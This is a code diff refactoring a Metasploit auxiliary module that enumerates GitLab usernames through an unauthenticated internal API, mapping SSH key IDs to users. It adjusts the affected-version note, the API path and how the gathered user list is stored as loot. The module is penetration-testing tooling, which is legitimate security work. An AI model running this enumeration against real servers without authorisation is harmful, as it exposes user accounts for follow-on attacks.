@@ -20,8 +20,8 @@ class Metasploit3 < Msf::Auxiliary
         The Gitlab 'internal' API is exposed unauthenticated on Gitlab. This
         allows the username for each SSH Key ID number to be retrieved. Users
         who do not have an SSH Key cannot be enumerated in this fashion. LDAP
-        users, e.g. Active Directory users will also be returned.
-        This issue was fixed in Gitlab v7.5.0.
+        users, e.g. Active Directory users will also be returned. This issue
+        was fixed in Gitlab v7.5.0 and is present from Gitlab v5.0.0.
       ",
       'Author'      => 'Ben Campbell',
       'License'     => MSF_LICENSE,
@@ -41,8 +41,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(_ip)
-    api = '/api/v3'
-    internal_api = "#{api}/internal"
+    internal_api = '/api/v3/internal'
     check = normalize_uri(target_uri.path, internal_api, 'check')
 
     print_status('Sending gitlab version request...')
@@ -56,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
       git_revision = version['gitlab_rev']
       print_good("GitLab version: #{git_version} revision: #{git_revision}")
 
-      report_service(
+      service = report_service(
         host: rhost,
         port: rport,
         name: (ssl ? 'https' : 'http'),
@@ -106,19 +105,11 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     unless users.nil? || users.to_s.empty?
-      store_userlist(users)
+      store_userlist(users, service)
     end
   end
 
-  def store_userlist(users)
-    name = datastore['SSL'] ? 'https' : 'http'
-    service = report_service(
-      :host  => rhost,
-      :port => rport,
-      :name => name,
-      :proto => 'tcp'
-    )
-
+  def store_userlist(users, service)
     loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'Gitlab Users', service)
     print_good("Userlist stored at #{loot}")
   end
